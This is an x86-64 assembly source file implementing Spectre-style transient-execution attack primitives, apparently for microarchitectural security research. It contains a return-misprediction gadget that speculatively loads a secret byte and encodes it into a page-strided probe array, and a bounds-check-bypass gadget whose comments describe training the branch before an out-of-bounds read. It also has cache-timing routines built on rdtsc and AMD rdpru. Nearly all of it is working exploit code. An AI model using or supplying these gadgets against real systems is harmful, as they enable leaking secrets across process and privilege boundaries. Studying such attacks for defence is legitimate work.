section .note.GNU-stack noalloc noexec nowrite progbits
section .text
    global add, spec_ret_gadget, spec_ret_gadget_burst, spec_ret_store_gadget, spec_read_gadget, spec_branch_read_gadget, time_memory_load, time_memory_load_rdpru, time_memory_load_rdpru_aperf

add:
    mov rax, rdi
    add rax, rsi
    ret


spec_ret_gadget:
    call level_a
    jmp end
level_a:
    call mispredict_return
    ; speculative code goes here
    ; mov rax, qword [rdi]
    ; mov rax, qword [rdi]
    mov rax, qword [rdi]
mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
end:
    ret

spec_ret_gadget_burst:
    call burst_level_a
    jmp burst_end
burst_level_a:
    call burst_mispredict_return
    ; Touch several lines in the target page to amplify the page-local footprint.
    mov rax, qword [rdi + 0]
    mov rax, qword [rdi + 64]
    mov rax, qword [rdi + 128]
    mov rax, qword [rdi + 192]
    mov rax, qword [rdi + 256]
    mov rax, qword [rdi + 320]
    mov rax, qword [rdi + 384]
    mov rax, qword [rdi + 448]
burst_mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
burst_end:
    ret

spec_ret_store_gadget:
    call store_level_a
    jmp store_end
store_level_a:
    call store_mispredict_return
    mov qword [rdi], 42
    ; mov rax, qword [rdi]
store_mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
store_end:
    ret

; void spec_read_gadget(void *secret, void *probe_array)
; rdi = address of secret byte
; rsi = probe array base (must be NUM_BYTE_SLOTS * PAGE_SIZE bytes)
; Speculatively loads secret byte and uses its value to index into probe_array,
; encoding the byte value into the cache as a side channel.
spec_read_gadget:
    call read_level_a
    jmp read_end
read_level_a:
    call read_mispredict_return
    movzx rax, byte [rdi]       ; speculatively load secret byte
    shl rax, 12                 ; rax *= PAGE_SIZE (4096 = 2^12)
    add rax, rsi                ; rax = &probe_array[secret_byte * PAGE_SIZE]
    mov rcx, [rax]              ; bring that cache line in
    lfence
read_mispredict_return:
    pop rax
    clflush [rsp]
    lfence
    ret
read_end:
    ret

; void spec_branch_read_gadget(size_t idx, size_t *bound_ptr,
;                              unsigned char *base, void *probe_array)
; rdi = idx
; rsi = bound_ptr
; rdx = base
; rcx = probe_array
; Architecturally, the load+encode only happens when idx < *bound_ptr.
; The caller trains the branch with in-bounds indices, then flushes bound_ptr
; and issues an out-of-bounds idx so the body may execute transiently.
spec_branch_read_gadget:
    mov r8, [rsi]
    cmp rdi, r8
    jae branch_read_done
    movzx r9, byte [rdx + rdi]
    shl r9, 12
    mov r10, [rcx + r9]
branch_read_done:
    ret

time_memory_load:
    lfence
    rdtsc
    mov rsi, rax
    mov rcx, [rdi]
    lfence
    rdtsc
    sub rax, rsi
    ret

; long time_memory_load_rdpru(void *ptr)
; AMD Zen 2+ only. Uses RDPRU (ECX=0 -> MPERF) to count actual core cycles
; rather than the fixed reference frequency used by RDTSC. More accurate
; under frequency scaling / turbo.
time_memory_load_rdpru:
    lfence
    xor ecx, ecx        ; ECX=0 selects MPERF (max frequency clock)
    db 0x0F, 0x01, 0xFD ; rdpru — raw encoding for older NASM versions
    mov rsi, rax
    mov r8, [rdi]       ; load from target (r8 to avoid clobbering rdi)
    lfence
    xor ecx, ecx
    db 0x0F, 0x01, 0xFD ; rdpru
    sub rax, rsi
    ret

time_memory_load_rdpru_aperf:
    lfence
    mov ecx, 1          ; ECX=1 selects APERF (actual performance frequency clock)
    db 0x0F, 0x01, 0xFD ; rdpru
    mov rsi, rax
    mov r8, [rdi]       ; load from target (r8 to avoid clobbering rdi)
    lfence
    mov ecx, 1
    db 0x0F, 0x01, 0xFD ; rdpru
    sub rax, rsi
    ret
